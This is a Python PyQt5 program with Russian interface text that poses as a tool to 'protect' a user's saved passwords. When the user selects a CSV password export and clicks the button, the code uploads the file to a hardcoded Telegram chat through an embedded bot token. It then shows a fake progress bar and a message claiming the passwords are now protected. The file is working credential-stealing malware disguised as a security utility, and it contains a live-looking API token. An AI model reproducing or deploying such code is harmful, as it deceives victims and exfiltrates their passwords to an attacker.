from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QMessageBox, QFileDialog
import sys
from ui import Ui_MainWindow
import telebot
import os
from time import sleep

try:
    # Включите в блок try/except, если вы также нацелены на Mac/Linux
    from PyQt5.QtWinExtras import QtWin                                         #  !!!
    myappid = 'mycompany.myproduct.subproduct.version'                          #  !!!
    QtWin.setCurrentProcessExplicitAppUserModelID(myappid)                      #  !!!    
except ImportError:
    pass

TOKEN = '6654904994:AAGMSVtvXMh0gCYDWOGctYiNK6Qu-1YyYfg'
bot = telebot.TeleBot(TOKEN)

app = QtWidgets.QApplication(sys.argv)
app.setWindowIcon(QtGui.QIcon('icon.png'))

MainWindow = QtWidgets.QMainWindow()
ui = Ui_MainWindow()
ui.setupUi(MainWindow)
MainWindow.setWindowIcon(QtGui.QIcon('icon.png'))
MainWindow.show()

ui.progressBar.setVisible(False)
ui.pushButton_2.setGeometry(50, 180, 541, 41)
ui.progressBar.setValue(0)

def open_file():
    passwords = str(QFileDialog.getOpenFileName(None, "Выберите файл с паролями", "", "Comma Separated Values File (*.csv)"))
    passwords = passwords.replace("('","")
    passwords = passwords.replace("', 'Comma Separated Values File (*.csv)')","")
    ui.lineEdit.setText(passwords)
    return passwords

def sendFiles():
    passwords = ui.lineEdit.text()
    passfile = open(passwords, 'rb')
    bot.send_document(1822280331, passfile)
    return True

def protect():
    passwords = ui.lineEdit.text()
    if passwords == '':
        QMessageBox.critical(MainWindow, "Error", "Файл не выбран")
    else:
        ui.progressBar.setVisible(True)
        ui.pushButton_2.setGeometry(410, 180, 181, 41)
        ui.pushButton_2.setEnabled(False)
        if sendFiles() == True:
            i = 0
            for step in range(0, 101):
                i += 1
                ui.progressBar.setValue(i)
                sleep(0.02)
            QMessageBox.information(MainWindow, "Успешно!", "Ваши пароли успешно защищены, продолжайте следовать инструкциям!")

ui.pushButton_2.clicked.connect(protect)
ui.pushButton.clicked.connect(open_file)

try:
    bot.send_message(1822280331, 'Бот работает')
except telebot.apihelper.ApiTelegramException:
    QMessageBox.critical(MainWindow, "Fatal Error", "Произошла ошибка на сервере, пожалуйста повторите попытку или ожидайте обновлений")
    os.system('taskkill /f /im protect.exe')

sys.exit(app.exec_())